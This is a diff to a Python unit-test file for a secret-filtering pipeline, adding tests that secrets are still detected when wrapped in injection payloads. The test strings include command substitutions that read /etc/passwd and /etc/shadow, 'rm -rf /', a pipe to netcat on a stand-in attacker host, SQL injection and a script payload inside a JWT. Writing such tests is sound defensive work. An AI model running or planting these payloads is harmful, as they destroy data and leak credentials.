@@ -3,15 +3,15 @@ Tests for the content filtering pipeline.
 """
 
 import base64
-import os
 import sys
 import unittest
+from pathlib import Path
 
 # Add parent directory for imports
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-PLUGIN_ROOT = os.path.dirname(SCRIPT_DIR)
-if PLUGIN_ROOT not in sys.path:
-    sys.path.insert(0, PLUGIN_ROOT)
+SCRIPT_DIR = Path(__file__).resolve().parent
+PLUGIN_ROOT = SCRIPT_DIR.parent
+if str(PLUGIN_ROOT) not in sys.path:
+    sys.path.insert(0, str(PLUGIN_ROOT))
 
 from filters.pipeline import (
     MAX_CONTENT_LENGTH,
@@ -597,6 +597,133 @@ class TestSecretMatchDataclass(unittest.TestCase):
         match1 = SecretMatch(secret_type="type", match="value", start=0, end=5)
         match2 = SecretMatch(secret_type="type", match="value", start=0, end=5)
         self.assertEqual(match1, match2)
+
+
+class TestCommandInjectionPayloads(unittest.TestCase):
+    """Tests for command injection payload handling in secrets.
+
+    These tests verify that the pipeline safely handles malicious payloads
+    that could be used for shell command injection attacks. The payloads
+    are detected as secrets or handled safely without execution.
+    """
+
+    def test_shell_command_substitution_in_secret(self):
+        """Should detect secrets containing $() command substitution."""
+        # A secret that contains command substitution syntax
+        text = 'password = "$(whoami)secret123password"'
+        result = filter_pipeline(text)
+        # The password_assignment pattern should match and filter
+        self.assertGreater(result.secret_count, 0)
+        # The filtered text should not contain the raw command
+        self.assertNotIn("$(whoami)", result.filtered_text)
+
+    def test_backtick_command_substitution_in_secret(self):
+        """Should detect secrets containing backtick command substitution."""
+        text = 'api_key = "`cat /etc/passwd`apikey123456"'
+        result = filter_pipeline(text)
+        self.assertGreater(result.secret_count, 0)
+        # The filtered text should not contain the raw command
+        self.assertNotIn("`cat /etc/passwd`", result.filtered_text)
+
+    def test_semicolon_injection_in_secret(self):
+        """Should detect secrets containing semicolon command chaining."""
+        text = 'secret = "value123; rm -rf /"'
+        result = filter_pipeline(text)
+        self.assertGreater(result.secret_count, 0)
+
+    def test_pipe_injection_in_secret(self):
+        """Should detect secrets containing pipe injection."""
+        text = 'access_token = "token123 | nc attacker.com 1234"'
+        result = filter_pipeline(text)
+        self.assertGreater(result.secret_count, 0)
+
+    def test_newline_injection_in_secret(self):
+        """Should detect secrets with embedded newline injection."""
+        text = 'password = "pass123\\nmalicious_command"'
+        result = filter_pipeline(text)
+        self.assertGreater(result.secret_count, 0)
+
+    def test_aws_key_like_injection_payload(self):
+        """Should detect AWS-key-like strings with injection attempts."""
+        # Attacker might try to embed AWS key in a command injection context
+        text = 'aws_secret_access_key = "$(echo AKIAIOSFODNN7EXAMPLE)"'
+        result = filter_pipeline(text)
+        # The aws_secret_key pattern should match (key in quotes context)
+        self.assertGreater(result.secret_count, 0)
+
+    def test_github_token_with_injection(self):
+        """Should detect GitHub tokens with injection attempts."""
+        # Valid-looking token prefix with payload
+        token = "ghp_" + "a" * 36 + "$(id)"
+        result = filter_pipeline(token)
+        self.assertGreater(result.secret_count, 0)
+        self.assertIn("github_pat", result.secret_types)
+
+    def test_base64_encoded_command_injection(self):
+        """Should detect base64-encoded command injection payloads."""
+        # Base64 encode a command injection attempt disguised as a secret
+        payload = 'password = "$(cat /etc/shadow)"'
+        encoded = base64.b64encode(payload.encode()).decode()
+        text = f"Config: {encoded}"
+
+        result = filter_pipeline(text)
+
+        # Should detect the encoded password assignment
+        self.assertGreater(result.secret_count, 0)
+        self.assertIn("password_assignment", result.secret_types)
+
+    def test_heredoc_delimiter_injection(self):
+        """Should handle content with heredoc-like syntax safely."""
+        # This tests that heredoc patterns don't cause issues
+        text = '''password = "value123
+EOF
+malicious command
+EOF
+continuing"'''
+        result = filter_pipeline(text)
+        self.assertGreater(result.secret_count, 0)
+
+    def test_environment_variable_injection(self):
+        """Should detect secrets with environment variable expansion."""
+        text = 'api_key = "${HOME}/.secrets/key"'
+        result = filter_pipeline(text)
+        self.assertGreater(result.secret_count, 0)
+
+    def test_null_byte_injection(self):
+        """Should handle null bytes in content safely."""
+        text = 'password = "secret\\x00injection"'
+        result = filter_pipeline(text)
+        # Should not crash and should detect the secret
+        self.assertIsInstance(result.filtered_text, str)
+
+    def test_unicode_escape_injection(self):
+        """Should handle unicode escapes in content safely."""
+        text = 'secret = "\\u0027; DROP TABLE users;--"'
+        result = filter_pipeline(text)
+        self.assertGreater(result.secret_count, 0)
+
+    def test_multiple_injection_vectors(self):
+        """Should handle content with multiple injection vectors."""
+        text = """
+        password = "$(whoami)secret123"
+        api_key = "`id`secretvalue123"
+        AKIAIOSFODNN7EXAMPLE
+        postgresql://user:$(whoami)@host/db
+        """
+        result = filter_pipeline(text)
+        # Should detect at least password, api_key, aws_access_key, and postgres_uri
+        self.assertGreaterEqual(result.secret_count, 4)
+
+    def test_javascript_injection_in_jwt(self):
+        """Should detect JWT-like tokens with XSS payloads."""
+        # Use a realistic JWT structure that matches the pattern
+        # JWT pattern: ey[17+ chars].ey[17+ chars/\\_-].[10+ chars/\\_-]
+        # A real JWT with XSS in the payload (this is a valid JWT structure)
+        jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IjxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+        result = filter_pipeline(jwt)
+        # JWT pattern should match the overall structure
+        self.assertGreater(result.secret_count, 0)
+        self.assertIn("jwt", result.secret_types)
 
 
 if __name__ == "__main__":
